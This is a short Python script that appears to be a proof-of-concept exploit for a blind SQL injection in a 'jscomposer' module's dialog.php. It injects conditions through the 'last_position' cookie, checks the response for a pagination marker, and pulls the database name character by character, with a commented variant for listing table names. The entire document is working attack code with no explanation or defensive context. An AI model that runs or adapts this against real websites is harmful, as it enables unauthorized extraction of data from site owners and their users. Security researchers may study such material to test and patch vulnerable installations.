import requests
import sys

url = 'https://url/modules/jscomposer/views/dialog.php'

def sqli(injection):
    cookies = {
        'last_position': "xxx/' or %s -- -" % injection
            }
    r = requests.get(url,cookies=cookies)
    if '<span aria-hidden="true">Last &raquo;</span>' in r.text:
        return True
    else:
        return False

def exploit():
    query = "(select database())"
    #query = "(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1)"
    result = ''
    previous_result = ''
    for i in range(1,500):
        found = False
        for c in range(32,126):
            q = "chr(%d)=substring(%s,%d,1)" % (c,query,i)
            print('try : %s' %q)
            if sqli(q):
                result += chr(c)
                print(result)
                found = True
                break
        if not found or previous_result==result:
            sys.exit(0)
        previous_result=result

exploit()
